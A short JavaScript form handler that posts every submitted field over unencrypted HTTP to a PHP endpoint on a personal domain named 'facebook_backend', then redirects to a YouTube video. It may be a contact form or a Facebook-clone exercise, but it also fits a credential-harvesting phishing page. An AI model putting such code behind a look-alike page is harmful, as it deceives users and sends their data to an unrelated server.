const form = document.querySelector("form");
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const formData = new FormData(e.target);
  const data = Object.fromEntries(formData.entries());

  const response = await fetch(
    "http://www.facebook_backend.hadrien-janssens.com/submitContact.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }
  );
  let resultat = await response.json();
  if (resultat.success) {
    window.location.href = "https://www.youtube.com/watch?v=xzza5ID6kJ8&t=348s";
  }
});
